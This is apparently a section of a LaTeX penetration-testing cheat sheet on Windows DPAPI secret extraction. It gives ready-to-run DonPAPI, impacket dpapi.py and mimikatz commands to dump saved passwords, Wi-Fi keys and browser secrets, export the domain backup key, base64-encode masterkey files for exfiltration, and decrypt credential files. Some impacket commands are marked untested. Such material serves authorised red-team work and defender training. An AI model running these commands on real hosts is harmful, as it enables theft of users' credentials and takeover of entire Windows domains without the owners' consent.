\section{Data Protection API (DPAIP)}

\subsection{Remotly}


\subsubsection{DonPAPI}
\href{https://github.com/login-securite/DonPAPI}{DonPAPI} 

With local admin account on a host, we can :
\begin{itemize}
    \item 
        Gather machine protected DPAPI secrets
        \begin{itemize}
            \item 
                ScheduledTask that will contain cleartext login/password of the account configured to run the task
            \item 
                Wi-Fi passwords
        \end{itemize}
    \item 
        Extract Masterkey's hash value for every user profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
    \item 
        Identify who is connected from where, in order to identify admin's personal computers.
    \item 
        Extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)
    \item 
        Gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant.
\end{itemize}

With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.


\begin{verbatim}
# Dump all secrets of the target machine with an admin account 
$ DonPAPI.py domain/user:passw0rd@target

#Using user's hash
$ DonPAPI.py --hashes <LM>:<NT> domain/user@target

# Using kerberos (-k) and local auth (-local_auth)
$ DonPAPI.py -k domain/user@target
$ DonPAPI.py -local_auth user@target

# Using a user with LAPS password reading rights
$ DonPAPI.py -laps domain/user:passw0rd@target

# with a file containing a list of {user1:pass1]
$ DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target

# When a domain admin user is available, it is possible to dump the domain
backup key using impacket dpapi
$ dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
$ DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
\end{verbatim}

\subsection{Online / offline}
\href{https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials}{howto
credential manager saved credentials}

\subsubsection{exfiltrate the files to a windows attacker}

the files must be converted to base64.

cmd:
\begin{verbatim}
cd %appdata%\Microsoft\Protect\<SID>
certutil -encode <masterkey> C:\temp\mkey
\end{verbatim}

with powershell:
\begin{verbatim}
cd %appdata%\Microsoft\Protect\<SID>
[Convert]::ToBase64String([IO.File]::ReadAllBytes(".\<masterkey>"))
\end{verbatim}

do the same thing for content file
(\verb+%localappdata\Microsoft\Credentials\XXX+)


\subsubsection{Impacket's dpapi}





\begin{verbatim}
# (not tested) Decrypt a master key
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# (not tested) Obtain the backup keys & use it to decrypt a master key
dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

# (not tested) Decrypt DPAPI-protected data using a master key
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
\end{verbatim}

\subsubsection{Impacket secretsdump}

\subsection{Mimikatz}

files must be decoded. Next, using mimikatz we're going to decrypt the
masterkey indicating the user's SID and password. mimikatz~\ref{tools:mimikatz}
module \verb+dpapi::masterkey+ with the appropriate arguments (\verb+/pvk+ or
\verb+/rpc+) to decrypt it.

\begin{verbatim}
mimikatz # dpapi::masterkey /in:<masterkey_path>
    /sid:S-1-5-21-953262931-566350628-63446256-1001 
    /password:<user_password>
\end{verbatim}

If everything works as expected, mimikatz should place the decrypted masterkey
in cache.

\begin{verbatim}
mimikatz # dpapi::cache
\end{verbatim}


Now we can read the credentials file using mimikatz module \verb+dpapi::cred+
with the appropiate \verb+/masterkey+ to decrypt.

\begin{verbatim}
mimikatz # dpapi::cred /in:<cred_path>
\end{verbatim}

You can extract many DPAPI masterkeys from memory with the
\verb+sekurlsa::dpapi+ module (if you are root).


\subsection{Links}
\begin{itemize}
    \item 
        \href{https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords}{HackTricks
        DPAPI - Extracting Passwords}
    \item 
        \href{https://docs.google.com/viewerng/viewer?url=https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf}{DPAPI
        exploitation during pentest and password cracking}
\end{itemize}


